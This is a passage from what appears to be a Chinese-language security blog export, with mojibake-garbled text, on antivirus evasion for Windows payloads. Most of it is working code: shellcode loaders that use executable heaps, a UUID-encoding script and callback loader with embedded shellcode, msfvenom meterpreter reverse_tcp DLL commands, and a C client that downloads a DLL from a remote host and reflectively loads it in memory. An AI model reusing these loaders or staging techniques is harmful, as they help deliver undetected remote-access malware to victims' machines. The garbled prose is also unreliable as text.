†ä¸­å­˜æ”¾çš„å†…å®¹æ˜¯å¯ä»¥æ‰§è¡Œçš„ä»£ç ã€‚å¦‚æœä¸è®¾ç½®ï¼Œæ„å‘³ç€å †ä¸­å­˜æ”¾çš„æ˜¯ä¸å¯æ‰§è¡Œçš„æ•°æ®<br>æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯å°†shellcodeå­˜å…¥åˆ°è¿™ä¸ªè¾…åŠ©è¿›ç¨‹ä¸­<br>ç›´æ¥è´´ä¸Šç¤ºä¾‹ä»£ç <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> shellcode[] = <span class="hljs-string">&quot;123&quot;</span>;<br><br>HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>PVOID Mptr = HeapAlloc(hHep, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>RtlCopyMemory(Mptr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>DWORD dwThreadId = <span class="hljs-number">0</span>;<br>HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)Mptr, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;dwThreadId);<br>WaitForSingleObject(hThread, INFINITE);<br><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Hello World!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="Bin2UUID"><a href="#Bin2UUID" class="headerlink" title="Bin2UUID"></a>Bin2UUID</h3><p>è¿™æ˜¯é€šè¿‡å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆuniversally unique identifier, UUIDï¼‰æ¥å­˜å‚¨shellcodeï¼Œå¹¶ä½¿ç”¨CALL BACKå‡½æ•°çš„ç‰¹æ€§æ¥åŠ è½½Shellcode<br>è¿™é‡Œç›´æ¥è´´ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> UUID<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Usage: python3 binToUUIDs.py shellcode.bin [--print]</span><br><br>print(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">  ____  _    _______    _    _ _    _ _____ _____       </span><br><span class="hljs-string"> |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      </span><br><span class="hljs-string"> | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  </span><br><span class="hljs-string"> |  _ &lt;| | &#x27;_ \| |/ _ \| |  | | |  | | | | | |  | / __| </span><br><span class="hljs-string"> | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ </span><br><span class="hljs-string"> |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/</span><br><span class="hljs-string">\n&quot;&quot;&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">bin</span> = f.read()<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">2</span>] == <span class="hljs-string">&quot;--print&quot;</span>:<br>    outputMapping = <span class="hljs-literal">True</span><br><span class="hljs-keyword">else</span>:<br>    outputMapping = <span class="hljs-literal">False</span><br><br>offset = <span class="hljs-number">0</span><br><br>print(<span class="hljs-string">&quot;Length of shellcode: &#123;&#125; bytes\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>)))<br><br>out = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">while</span>(offset &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>)):<br>    countOfBytesToConvert = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>[offset:])<br>    <span class="hljs-keyword">if</span> countOfBytesToConvert &lt; <span class="hljs-number">16</span>:<br>        ZerosToAdd = <span class="hljs-number">16</span> - countOfBytesToConvert<br>        byteString = <span class="hljs-built_in">bin</span>[offset:] + (<span class="hljs-string">b&#x27;\x00&#x27;</span>* ZerosToAdd)<br>        uuid = UUID(bytes_le=byteString)<br>    <span class="hljs-keyword">else</span>:<br>        byteString = <span class="hljs-built_in">bin</span>[offset:offset+<span class="hljs-number">16</span>]<br>        uuid = UUID(bytes_le=byteString)<br>    offset+=<span class="hljs-number">16</span><br><br>    out += <span class="hljs-string">&quot;\&quot;&#123;&#125;\&quot;,\n&quot;</span>.<span class="hljs-built_in">format</span>(uuid)<br>    <br>    <span class="hljs-keyword">if</span> outputMapping:<br>        print(<span class="hljs-string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(byteString, uuid))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;UUIDs&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(out)<br><br>print(<span class="hljs-string">&quot;Outputted to: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;UUIDs&quot;</span>))<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;rpc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;Rpcrt4.lib&quot;</span>)</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * buf[] = &#123;<br><span class="hljs-string">&quot;4baf01bd-dbdd-d9de-7424-f45a33c9b131&quot;</span>,<br><span class="hljs-string">&quot;83136a31-04c2-6a03-0e4d-be21f81341da&quot;</span>,<br><span class="hljs-string">&quot;3fcb73f8-b3c9-34af-7904-bb1975efe989&quot;</span>,<br><span class="hljs-string">&quot;bd259d0e-28a7-f010-3800-6093ba5bb573&quot;</span>,<br><span class="hljs-string">&quot;72c89383-cec4-2621-9d85-94d7aad02453&quot;</span>,<br><span class="hljs-string">&quot;802cf5e0-f4b0-171d-cbae-bd9918dbf781&quot;</span>,<br><span class="hljs-string">&quot;394ee67d-9cb5-eb50-845d-fed229acfe13&quot;</span>,<br><span class="hljs-string">&quot;6a754f8d-f2ee-a98e-8d28-1a2a35babc96&quot;</span>,<br><span class="hljs-string">&quot;5c5a6fc4-c4ca-3a28-cedb-fd30ea500097&quot;</span>,<br><span class="hljs-string">&quot;3327227b-f020-6246-8c57-76746f07d2fe&quot;</span>,<br><span class="hljs-string">&quot;5d6f5c9d-a3cb-dbfd-b9a4-fde3edcccc68&quot;</span>,<br><span class="hljs-string">&quot;bad08a62-64c7-e79b-61ed-4272307075a8&quot;</span>,<br><span class="hljs-string">&quot;59f68d76-6a06-2be6-0336-a0c0792745e7&quot;</span>,<br><span class="hljs-string">&quot;844c482e-dab1-650c-545b-b67900000000&quot;</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><br><span class="hljs-keyword">int</span> dwNum = <span class="hljs-keyword">sizeof</span>(buf) / <span class="hljs-keyword">sizeof</span>(buf[<span class="hljs-number">0</span>]);<br><br>HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (hMemory == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>PVOID pMemory = HeapAlloc(hMemory, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>);<br><br>DWORD_PTR CodePtr = (DWORD_PTR)pMemory;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; dwNum; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (CodePtr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RPC_STATUSstatus = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr);<br><span class="hljs-keyword">if</span> (status != RPC_S_OK) &#123;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>CodePtr += <span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (pMemory == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, <span class="hljs-literal">NULL</span>) == FALSE) &#123;<br><span class="hljs-comment">// åŠ è½½æˆåŠŸ</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/10/20/vOoGBN12nH5qWMt.png" alt="æˆåŠŸæ‰§è¡Œ"></p><p>è®°å½•ä¸€ä¸ªæ–°å­¦çš„ç‚¹ï¼Œmsfvenomç”Ÿæˆæœ¨é©¬æ—¶ï¼Œå¯ä»¥ç”¨-bå»é¿å…æ‰€ç”Ÿæˆçš„shellä¸­åŒ…å«çš„å­—ç¬¦<br>é€šå¸¸æ˜¯-b â€˜\xfc\xe8â€™æˆ–è€…-b â€˜\x00â€™æ¥å‡å°msfç çš„æ–‡ä»¶ç‰¹å¾</p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€æ¶æ„ä»£ç é€ƒé€¸2</title>
      <link href="2022/10/19/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B82/"/>
      <url>2022/10/19/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B82/</url>
      
        <content type="html"><![CDATA[<h1 id="é™æ€æ¶æ„ä»£ç é€ƒé€¸2"><a href="#é™æ€æ¶æ„ä»£ç é€ƒé€¸2" class="headerlink" title="é™æ€æ¶æ„ä»£ç é€ƒé€¸2"></a>é™æ€æ¶æ„ä»£ç é€ƒé€¸2</h1><p>æœ€è¿‘åœ¨å­¦ä¹ ä»åº•å±‚ç”¨C/C++å»å®ç°å…æ€ï¼Œè€Œçœ‹åˆ°äº†å…³äºé™æ€æ¶æ„ä»£ç é€ƒé€¸çš„ä¸€äº›å¾ˆå¥½çš„æ–‡ç« ï¼Œåœ¨æ­¤è®°å½•æ€»ç»“ä¸€ä¸‹</p><a id="more"></a><h3 id="åå°„DLLåŠ è½½"><a href="#åå°„DLLåŠ è½½" class="headerlink" title="åå°„DLLåŠ è½½"></a>åå°„DLLåŠ è½½</h3><p>å¯¹äºåŠ è½½DLLè€Œè¨€ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡LoadLibraryè¿™ä¸ªAPIæ¥å®ç°ï¼Œä½†è¿™é‡Œæˆ‘ä»¬å»ä½¿ç”¨memoryModule<br><a href="https://silver-glacier.github.io/2022/10/18/MemoryModule%E7%9A%84%E5%AD%A6%E4%B9%A0/">å‰ç½®çŸ¥è¯†</a></p><p>å°†è¯¥é¡¹ç›®ä¸‹è½½ä¹‹åï¼Œä¸»è¦ä½¿ç”¨çš„æ˜¯<code>MemoryModule.hã€MemoryModule.cpp</code>æ–‡ä»¶</p><p>è®°å½•ä¸€ä¸‹æŠ¥é”™ä¿¡æ¯ä¸å¤„ç†<br><code>wcsncpy: This function or variable may be unsafe. Consider using wcsncpy_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.</code></p><blockquote><p>å¤„ç†æ–¹æ³•ï¼šé¡¹ç›®å±æ€§ -&gt; C/C++ -&gt; é¢„å¤„ç†å™¨ -&gt; é¢„å¤„ç†å™¨å®šä¹‰ä¸­åŠ ä¸Š<code>_CRT_SECURE_NO_WARNINGS</code><br>ç½‘ä¸Šè¯´åœ¨å¤´éƒ¨åŠ ä¸Š <code>#define _CRT_SECURE_NO_WARNINGS</code>å®ç¼–è¯‘ä¹Ÿèƒ½è§£å†³é—®é¢˜ï¼Œä½†æˆ‘åœ¨è¿™é‡Œå®æµ‹ä¸è¡Œ</p></blockquote><p><code>MemoryLoadLibraryï¼šå‡½æ•°ä¸æ¥å—ä¸€ä¸ªå‚æ•°</code></p><blockquote><p>å¤„ç†æ–¹æ³•ï¼š å°†åŸè¯­å¥æ”¹ä¸º<code>hModule = MemoryLoadLibrary(bFileBuffer, dwReadOfFileSize);</code></p></blockquote><p><code>é“¾æ¥å™¨å·¥å…·é”™è¯¯ LINK 2001</code></p><blockquote><p>å¤„ç†æ–¹æ³•ï¼š ç”Ÿæˆçš„defæ–‡ä»¶ä¸source.cppæ–‡ä»¶åä¸ä¸€è‡´</p></blockquote><h4 id="åå°„DLLä¸MSF"><a href="#åå°„DLLä¸MSF" class="headerlink" title="åå°„DLLä¸MSF"></a>åå°„DLLä¸MSF</h4><p>é¦–å…ˆåˆ©ç”¨MSFæ¥ç”Ÿæˆä¸€ä¸ªDLLï¼Œç„¶åé€šè¿‡ç½‘ç»œå¥—æ¥å­—ï¼ˆSocketï¼‰æ¥å—ï¼Œä¸¢åˆ°MemoryModuleä¸­ï¼Œè®©å…¶æ‰§è¡Œ<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.129 LPORT=8899 -f dll -o shellcode.dll</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">handler -p windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp -H <span class="hljs-number">192.168</span>.<span class="hljs-number">152.129</span> -P <span class="hljs-number">8899</span><br>use exploit<span class="hljs-regexp">/multi/</span>handler <br>set payload windows<span class="hljs-regexp">/patchupdllinject/</span>reverse_tcp<br>set dll shellcode.dll<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥è´´ä¸Šå®¢æˆ·ç«¯ä»£ç ï¼Œè¿™ä¸ªä»£ç è¿˜æ˜¯å¾ˆå€¼å¾—å­¦ä¹ çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MemoryModule.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAYLOAD_SIZE 1024*512</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span> <span class="hljs-params">(*Module)</span><span class="hljs-params">(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">VOID</span> <span class="hljs-params">(*msg)</span><span class="hljs-params">(VOID)</span></span>;<br>PBYTE bFileBuffer = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-function">BOOL <span class="hljs-title">GetPEDLL</span><span class="hljs-params">()</span></span>&#123;<br><br>DWORD dwError;<br>WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>WSADATA wsaData;<br>SOCKET socks;<br>SHORT sListenPort = <span class="hljs-number">8888</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br><br><span class="hljs-keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>&#123;<br>dwError = GetLastError();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br><br><span class="hljs-keyword">if</span> (socks == INVALID_SOCKET)<br>&#123;<br>dwError = GetLastError();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br><span class="hljs-built_in">sin</span>.sin_port = htons(sListenPort);<br><span class="hljs-built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="hljs-string">&quot;192.168.170.138&quot;</span>);<br><br><span class="hljs-keyword">if</span>(connect(socks,(struct sockaddr *)&amp;<span class="hljs-built_in">sin</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">sin</span>)) == SOCKET_ERROR )<br>&#123;<br>dwError = GetLastError();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">2650</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br><br>ZeroMemory(bFileBuffer,PAYLOAD_SIZE);<br><br><br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">5120</span>,<span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>&#123;<br>closesocket(socks);<br>&#125;<br><br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125; <br><br><span class="hljs-comment">// æ‰“å¼€æ–‡ä»¶å¹¶è·å–å¤§å°</span><br><span class="hljs-function">DWORD <span class="hljs-title">OpenBadCodeDLL</span><span class="hljs-params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;<br>DWORD dwHighFileSize = <span class="hljs-number">0</span>;<br>DWORD dwLowFileSize = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// æ‰“å¼€æ–‡ä»¶</span><br>hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="hljs-literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;<br><span class="hljs-keyword">return</span> GetLastError();<br>&#125;<br>dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);<br><span class="hljs-keyword">return</span> dwLowFileSize;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>HMEMORYMODULE hModule;<br>Module DllMain;<br>bFileBuffer = <span class="hljs-keyword">new</span> BYTE[PAYLOAD_SIZE];<br>GetPEDLL();<br><span class="hljs-comment">// å¯¼å…¥PEæ–‡ä»¶</span><br>hModule = MemoryLoadLibrary(bFileBuffer);<br><span class="hljs-comment">// å¦‚æœåŠ è½½å¤±è´¥ï¼Œå°±é€€å‡º</span><br><span class="hljs-keyword">if</span>(hModule == <span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-keyword">delete</span> [] bFileBuffer;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">// è·å–msgå¯¼å‡ºå‡½æ•°åœ°å€</span><br>DllMain = (Module)MemoryGetProcAddress(hModule,<span class="hljs-string">&quot;DllMain&quot;</span>);<br><span class="hljs-comment">// è¿è¡Œmsgå‡½æ•°</span><br>DllMain(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><span class="hljs-comment">// é‡Šæ”¾èµ„æº</span><br>DWORD dwThread;<br>HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,(LPTHREAD_START_ROUTINE)DllMain,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,&amp;dwThread);<br><br>WaitForSingleObject(hThread,INFINITE);<br><br>MemoryFreeLibrary(hModule);<br><span class="hljs-comment">// é‡Šæ”¾PEå†…å­˜</span><br><span class="hljs-keyword">delete</span> [] bFileBuffer;<br><span class="hljs-keyword">return</span> GetLastError();<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æ¯”è¾ƒéš¾ä»¥ç†è§£çš„å°±æ˜¯GetPEDLLå‡½æ•°ä¸­çš„è¿™ä¸€éƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">2650</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br><br>ZeroMemory(bFileBuffer,PAYLOAD_SIZE);<br><br><br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">5120</span>,<span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯recv()è¿™ä¸ªå‡½æ•°<br>å‡½æ•°åŸå‹<code>int recv( _In_ SOCKET s, _Out_ char *buf, _In_ int len, 